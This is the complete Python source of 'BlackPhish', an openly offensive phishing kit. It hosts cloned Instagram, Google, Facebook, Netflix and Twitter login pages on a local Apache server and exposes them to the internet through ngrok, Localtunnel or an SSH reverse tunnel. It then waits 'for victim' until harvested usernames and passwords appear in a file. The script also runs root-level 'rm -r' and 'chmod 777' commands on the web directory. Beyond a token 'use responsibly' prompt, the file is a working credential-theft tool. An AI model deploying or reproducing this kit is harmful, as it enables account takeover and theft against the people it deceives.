#!/usr/bin/env python3

# You may change the code however you want
# Please create pull request to support the tool
# Please message us if you find any problems or ideas
# Lasted updated: 1/26/20
# version 3.2: - Bug fixes and improvements
# Please update version number each time we update


# Libraries #
from os import system, getcwd, geteuid
from time import sleep
from socket import create_connection, gethostname, gethostbyname
from distutils import dir_util
from sys import version_info



# Variables #
cwd = getcwd() # Gets working directory #

hostname = gethostname() # Get hostname #

localip = gethostbyname(hostname) # Get local IP by hostname #



# COLORS #
red = "\033[91;1m"
reset = "\033[0m"
green = "\033[92;1m"
cyan = "\033[96;1m"
yellow = "\033[93;1m"
magenta = "\033[95;1m"
blue = "\033[94;1m"
white = "\033[97;1m"
blink = "\033[5m"



# Check for python version #
if version_info < (3,0,0):
    exit(red + "[!] Please use python3: sudo python3 blackphish.py" + reset)

# Check for root #
if geteuid() != 0:
    exit(red + "[!] Please run as root" + reset)



def warning(): # Banner #
    print('''
\033[94;1m
                https://github.com/iinc0gnit0/BlackPhish\033[0m\033[91m
                

        ▀█████████▄                      ▀████████▄
          ███    ███                       ███    ███  
          ███    ███                       ███    ███ 
          ███▄▄▄██▀                        ███    ███ 
          ███▀▀▀██▄                        ████████▀ 
          ███    ██▄\033[31m  ┬  ┌─┐┌─┐┬┌─ \033[91m        ███ \033[31m ┬ ┬┬┌─┐┬ ┬ \033[91m
          ███    ███\033[31m  │  ├─┤│  ├┴┐ \033[91m        ███\033[31m  ├─┤│└─┐├─┤\033[91m
        ▄█████████▀ \033[31m  ┴─┘┴ ┴└─┘┴ ┴ \033[91m        ███\033[31m  ┴ ┴┴└─┘┴ ┴\033[94;1m         v3.2
        
                
                    Banner made by: \033[91;1m[ tuf_unkn0wn ]\033[94;1m
                    
                    Script created by: \033[91;1m[ inc0gnit0 ] [ retro0001 ]\033[94;1m

	            Revisions made by: \033[91;1m[ jackoftimeandreality ]\033[94;1m
                    
                    Websites created by: \033[91;1m[ TableFlipGod ]\033[94;1m 
                    
                    Big Thanks to: \033[91;1m [ DarkSecDevelopers ]\033[93;1m ''')
    print('\n')
    warningchoice = input("                    Will you use this responsibly (\033[94;1my\033[93;1m/\033[91mn\033[93;1m): ") # Agreement Message #

    if warningchoice == 'y':
        print("")
    else:
        endMessage()



def checkInternet(): # Checks for internet connection #
    print(yellow + "[*] Checking connection...")
    try:
        create_connection(("www.google.com", 80)) # Tries to connect to google.com #
        print(green + "[+] Internet Found")
        sleep(2)
    except OSError: # Checks for OSError #
        print(red + "[!] Internet Not Found" + reset)
        exit(0)



def setup(template):
    print('\n')
    print(red + '           [1]' + blue + ' ngrok (recommended)')
    print(red + '           [2]' + blue + ' Localtunnel')
    print(red + '           [3]' + blue + ' localhost.run')
    print(red + '           [4]' + blue + ' Localhost only\n\n')
    choice1 = input(red + "        [" + blue + f"BlackPhish-{template}" + red + "] -> ")

    # Setup #
    if choice1 == '1':
        system("clear")
        print(green + '[+] Copying Files')
        sleep(0.1)
        print(green + '[+] Cleaning /var/www/html/')
        sleep(0.1)
        system('rm -r /var/www/html/ && mkdir /var/www/html/')  # Removing then adding /var/www/html/ #
        print(green + '[+] Cleaning /Server/www/')
        sleep(0.1)
        system('rm -r ' + cwd + "/Server/www && mkdir " + cwd + "/Server/www")  # Removes then adds /Server/www #
        dir_util.copy_tree(f"Websites/{template}",
                           "Server/www")  # Copies the entire folder of Websites/template to /Server/www #
        redirect()  # Redirect Prompt #
        print(green + '[+] Editing login.php(Do not edit/tamper with this file)')
        dir_util.copy_tree("Server/www", "/var/www/html")  # Copies from Server/www to /var/www/html #
        print(green + '[+] Copying to /var/www/html')
        sleep(0.1)
        system("chmod -R 777 /var/www/html")  # Change file permission of /var/www/html #
        print(green + '[+] Changing File Permissions')
        sleep(0.1)
        print(yellow + '[+] Starting Apache2 Service')
        sleep(0.1)
        system('service apache2 start')  # Starts apache2 service #
        print(green + '[+] Apache2 Service Started')
        sleep(0.1)
        print(blue + "\nLocal: " + red + localip + "\n")  # Shows where site is hosted locally #
        sleep(0.1)
        print(yellow + '[*] Starting ngrok')
        ngrokForward()  # ngrok port forward #
        print(yellow + "\n     Waiting For Victim ...  [Control + C] to stop\n")
        sleep(0.1)
        while True:  # Waits for content on usernames.txt #
            with open('/var/www/html/usernames.txt') as creds:
                lines = creds.read().rstrip()
                if len(lines) != 0:
                    print(green + "______________________________________________________________________________\n")
                    print('\n                CREDENTIALS FOUND\n\n')
                    system("cat /var/www/html/usernames.txt")
                    print("\n______________________________________________________________________________" + reset)
                    endMessage()

    elif choice1 == '2':
        system("clear")
        print(green + '[+] Copying Files')
        sleep(0.1)
        print(green + '[+] Cleaning /var/www/html/')
        sleep(0.1)
        system('rm -r /var/www/html/ && mkdir /var/www/html/')  # Removing then adding /var/www/html/ #
        print(green + '[+] Cleaning /Server/www/')
        sleep(0.1)
        system('rm -r ' + cwd + "/Server/www && mkdir " + cwd + "/Server/www")  # Removes then adds /Server/www #
        dir_util.copy_tree(f"Websites/{template}",
                           "Server/www")  # Copies the entire folder of Websites/template to /Server/www #
        redirect()  # Redirect Prompt #
        print(green + '[+] Editing login.php(Do not edit/tamper with this file)')
        dir_util.copy_tree("Server/www", "/var/www/html")  # Copies from Server/www to /var/www/html #
        print(green + '[+] Copying to /var/www/html')
        sleep(0.1)
        system("chmod -R 777 /var/www/html")  # Change file permission of /var/www/html #
        print(green + '[+] Changing File Permissions')
        sleep(0.1)
        print(yellow + '[+] Starting Apache2 Service')
        sleep(0.1)
        system('service apache2 start')  # Starts apache2 service #
        print(green + '[+] Apache2 Service Started')
        sleep(0.1)
        print(yellow + "\n[*] Local: " + green + localip + "\n")  # Shows where site is hosted locally #
        sleep(0.1)
        print(yellow + '[*] Starting Localtunnel')
        localTunnel()  # Localtunnel port forward #
        print(yellow + "\n     Waiting For Victim ...  [Control + C] to stop\n")
        sleep(0.1)
        while True:  # Waits for content on usernames.txt #
            with open('/var/www/html/usernames.txt') as creds:
                lines = creds.read().rstrip()
                if len(lines) != 0:
                    print(green + "______________________________________________________________________________\n")
                    print('\n                CREDENTIALS FOUND\n\n')
                    system("cat /var/www/html/usernames.txt")
                    print("\n______________________________________________________________________________" + reset)
                    endMessage()

    elif choice1 == '3':
        system("clear")
        print(green + '[+] Copying Files')
        sleep(0.1)
        print(green + '[+] Cleaning /var/www/html/')
        sleep(0.1)
        system('rm -r /var/www/html/ && mkdir /var/www/html/')  # Removing then adding /var/www/html/ #
        print(green + '[+] Cleaning /Server/www/')
        sleep(0.1)
        system('rm -r ' + cwd + "/Server/www && mkdir " + cwd + "/Server/www")  # Removes then adds /Server/www #
        dir_util.copy_tree(f"Websites/{template}",
                           "Server/www")  # Copies the entire folder of Websites/template to /Server/www #
        redirect()  # Redirect Prompt #
        print(green + '[+] Editing login.php(Do not edit/tamper with this file)')
        dir_util.copy_tree("Server/www", "/var/www/html")  # Copies from Server/www to /var/www/html #
        print(green + '[+] Copying to /var/www/html')
        sleep(0.1)
        system("chmod -R 777 /var/www/html")  # Change file permission of /var/www/html #
        print(green + '[+] Changing File Permissions')
        sleep(0.1)
        print(yellow + '[+] Starting Apache2 Service')
        sleep(0.1)
        system('service apache2 start')  # Starts apache2 service #
        print(green + '[+] Apache2 Service Started')
        sleep(0.1)
        print(yellow + "\n[*] Local: " + green + localip + "\n")  # Shows where site is hosted locally #
        sleep(0.1)
        print(yellow + '[*] Starting Localhost.run')
        localhost()  # Localhost.run port forward #
        while True:  # Waits for content on usernames.txt #
            with open('/var/www/html/usernames.txt') as creds:
                lines = creds.read().rstrip()
                if len(lines) != 0:
                    print(green + "______________________________________________________________________________\n")
                    print('\n                CREDENTIALS FOUND\n\n')
                    system("cat /var/www/html/usernames.txt")
                    print("\n______________________________________________________________________________" + reset)
                    endMessage()

    elif choice1 == '4':
        system("clear")
        print(green + '[+] Copying Files')
        sleep(0.1)
        print(green + '[+] Cleaning /var/www/html/')
        sleep(0.1)
        system('rm -r /var/www/html/ && mkdir /var/www/html/')  # Removing then adding /var/www/html/ #
        print(green + '[+] Cleaning /Server/www/')
        sleep(0.1)
        system('rm -r ' + cwd + "/Server/www && mkdir " + cwd + "/Server/www")  # Removes then adds /Server/www #
        dir_util.copy_tree(f"Websites/{template}",
                           "Server/www")  # Copies the entire folder of Websites/template to /Server/www #
        redirect()  # Redirect Prompt #
        print(green + '[+] Editing login.php(Do not edit/tamper with this file)')
        dir_util.copy_tree("Server/www", "/var/www/html")  # Copies from Server/www to /var/www/html #
        print(green + '[+] Copying to /var/www/html')
        sleep(0.1)
        system("chmod -R 777 /var/www/html")  # Change file permission of /var/www/html #
        print(green + '[+] Changing File Permissions')
        sleep(0.1)
        print(yellow + '[+] Starting Apache2 Service')
        sleep(0.1)
        system('service apache2 start')  # Starts apache2 service #
        print(green + '[+] Apache2 Service Started')
        sleep(0.1)
        print(yellow + "\n[*] Local: " + green + localip + "\n")  # Shows where site is hosted locally #
        sleep(0.1)
        print(yellow + "\n     Waiting For Victim ...  [Control + C] to stop\n")
        sleep(0.1)
        while True:  # Waits for content on usernames.txt #
            with open('/var/www/html/usernames.txt') as creds:
                lines = creds.read().rstrip()
                if len(lines) != 0:
                    print(green + "______________________________________________________________________________\n")
                    print('\n                CREDENTIALS FOUND\n\n')
                    system("cat /var/www/html/usernames.txt")
                    print("\n______________________________________________________________________________" + reset)
                    endMessage()

    else:
        print(red + '[!] Invalid Option')
        sleep(1)
        main()


# Port forward to ngrok #
def ngrokForward():
    # Set defaults
    port = 80
    method = "http"
    des_method = input(yellow + "\nWould you like to use tcp or http as your method?[default http]: ").lower()
    if not des_method:
        pass
    elif des_method == "tcp" or des_method == "http":
        method = des_method
    else:
        print("[!] Method entered invalid, resorting to default method http")
        sleep(2)
    des_port = input(yellow + "\nPort[default 80]: ")
    if des_port:
        try:
            port = int(des_port)
        except ValueError:
            print("[!] Port entered is not a number, resorting to default port 80")
            sleep(2)
    print("[!] Starting ngrok...")
    print("[!]A new terminal will spawn with the ngrok links, you can use HTTP or HTTPS")
    print("[!] Do not close out of the new terminal until you are finished")
    sleep(2)
    system(f"gnome-terminal -q -- /bin/bash -c 'cd {cwd} && ./ngrok {method} {port}'")



# Port forward with Localtunnel #
def localTunnel():
    name = input(yellow + "\nCustom Domain Name(don't need www. or domain extension): ")
    port = input(yellow + "\nPort[recommended 80]: ")
    print(yellow + '\n If prompt about RSA key, say yes' + green)
    sleep(2)
    system('lt -p ' + port + ' -s ' + name + ' --allow-invalid-cert --print-requests')



# Port forward with localhost.run #
def localhost():
    print(yellow + ' If prompt about RSA key, say yes' + green)
    sleep(2)
    system('ssh -R 80:localhost:80 ssh.localhost.run')



# Redirect Prompt #
def redirect():
    redirect = input(yellow + "URL redirect to: ")
    if 'http://' in redirect or 'https://' in redirect:
        with open('Server/www/login.php') as f:
            read = f.read()
        r = read.replace('<REDIRECT>', redirect)
        w = open('Server/www/login.php', 'w')
        w.write(r)
        w.close()
    
    else:
        redirect = 'https://' + redirect
        with open('Server/www/login.php') as f:
            read = f.read()
        r = read.replace('<REDIRECT>', redirect)
        w = open('Server/www/login.php', 'w')
        w.write(r)
        w.close()



# Banner #
def banner():
    print('''
\033[94;1m
                https://github.com/iinc0gnit0/BlackPhish\033[0m\033[91m
                

        ▀█████████▄                      ▀████████▄
          ███    ███                       ███    ███  
          ███    ███                       ███    ███ 
          ███▄▄▄██▀                        ███    ███ 
          ███▀▀▀██▄                        ████████▀ 
          ███    ██▄\033[31m  ┬  ┌─┐┌─┐┬┌─ \033[91m        ███ \033[31m ┬ ┬┬┌─┐┬ ┬ \033[91m
          ███    ███\033[31m  │  ├─┤│  ├┴┐ \033[91m        ███\033[31m  ├─┤│└─┐├─┤\033[91m
        ▄█████████▀ \033[31m  ┴─┘┴ ┴└─┘┴ ┴ \033[91m        ███\033[31m  ┴ ┴┴└─┘┴ ┴\033[94;1m         v3.2
        
                
                    Banner made by: \033[91;1m[ tuf_unkn0wn ]\033[94;1m
                    
                    Script created by: \033[91;1m[ inc0gnit0 ] [ retro0001 ]\033[94;1m

		    Revisions made by: \033[91;1m[ jackoftimeandreality ]\033[94;1m
                    
                    Websites created by: \033[91;1m[ TableFlipGod ]\033[94;1m 
                    
                    Big Thanks to: \033[91;1m [ DarkSecDevelopers ]\033[91;1m
                    
                    
                    
        [1]\033[94;1m Instagram \033[91;1m
        [2]\033[94;1m Google \033[91;1m
        [3]\033[94;1m Facebook \033[91;1m
        [4]\033[94;1m Netflix \033[91;1m
	[5]\033[94;1m Twitter \033[91;1m
        [0]\033[94;1m Clean \033[91;1m
        [x]\033[94;1m Exit
        
        
        \033[0m''')


    
def endMessage(): # Message when you exit #
    print("\n")
    print(yellow + "  Thank you using " + red + "BlackPhish\n")
    print(yellow + "  If you have any problems while using " + red + "BlackPhish " + yellow + "please report it to us\n")
    print(yellow + "  Make Pull Request to support this tool\n")
    print("\n" + reset)
    exit(0)



# Main Script #
def main():

    system("clear") # clear screen #

    checkInternet() # Check internet connection #

    warning() # Agree to use with responsibily #

    system('clear') # clear screen #

    banner() # Load Banner #

    choice = input(red + "        [" + blue + "BlackPhish" + red + "] -> ") # Get user input #



    # Host Instagram Page #
    if choice == "1":
        setup("Instagram")



    # Google #
    elif choice == '2':
        setup("Google")



    # Facebook #
    elif choice == '3':
        setup("Facebook")



    # Netflix #
    elif choice == '4':
        setup("Netflix")


    # Twitter
    elif choice == "5":
        setup("Twitter")

    # Clean out everything #
    elif choice == "0":
        print(green + '[+] Stopping Apache2 Service')
        system('service apache2 stop') # Stops apache2 service #
        print(green + '[+] Stopping Traffic forwarding to ngrok')
        system('pkill -f ngrok') # Stops ngrok #
        print(green + '[+] Cleaning /var/www/html/')
        system('rm -r /var/www/html/ && mkdir /var/www/html') # Removes and makes /var/www/html #
        print(green + '[+] Cleaning /Server/www/')
        system('rm -r ' + cwd + "/Server/www && mkdir " + cwd + "/Server/www") # Removes and makes /Server/www #
        print(green + '[+] Done')
        main()



    # Exit #
    elif choice == 'x':
        endMessage()



    # Invalid Option Error #
    else:
        print(red + "[!] Invalid option" + reset)
        main()



# This will start the script #
try:
    if __name__ == '__main__':
        main()

# Will detect if they exit #
except KeyboardInterrupt:
    print("\n")
    print(red + "[!] KeyboardInterrupt Detected")
    print(red + "[!] Exiting" + reset)
    exit(0)